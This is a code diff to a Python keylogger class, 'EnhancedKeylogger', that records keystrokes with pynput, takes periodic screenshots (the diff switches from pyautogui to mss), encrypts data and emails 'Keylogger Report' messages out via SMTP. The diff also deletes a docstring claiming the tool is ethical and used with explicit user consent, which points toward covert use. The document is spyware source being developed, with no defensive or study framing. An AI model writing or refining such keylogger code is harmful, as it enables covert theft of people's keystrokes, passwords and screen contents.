@@ -22,7 +22,6 @@ import smtplib
 import socket
 import requests
 import hashlib
-import pyautogui
 import clipboard
 import sys
 import time
@@ -31,10 +30,9 @@ from email.mime.text import MIMEText
 from email.mime.image import MIMEImage
 from pynput import keyboard
 from cryptography.fernet import Fernet
+from mss import mss
 
 class EnhancedKeylogger:
-    """A secure, ethical keylogger for monitoring with explicit user consent."""
-
     EMAIL_SUBJECT_PREFIX = "Keylogger Report -"
 
     def __init__(self, log_interval=300, screenshot_interval=60,
@@ -89,12 +87,13 @@ class EnhancedKeylogger:
 
     def take_screenshot(self):
         try:
-            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-            path = self._secure_temp_file()
-            pyautogui.screenshot(path)
-            self.pictures.append({"filename": f"screenshot_{timestamp}.jpg", "path": path})
-            if len(self.pictures) >= 5:
-                self.report(2)
+            with mss() as sct:
+                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+                path = self._secure_temp_file()
+                sct.shot(output=path)
+                self.pictures.append({"filename": f"screenshot_{timestamp}.jpg", "path": path})
+                if len(self.pictures) >= 5:
+                    self.report(2)
             threading.Timer(self.screenshot_interval, self.take_screenshot).start()
         except Exception as e:
             logging.error(f"Screenshot error: {e}")
@@ -248,4 +247,3 @@ if __name__ == "__main__":
         keylogger.start()
     except Exception as e:
         logging.critical(f"Initialization failed: {e}")
-
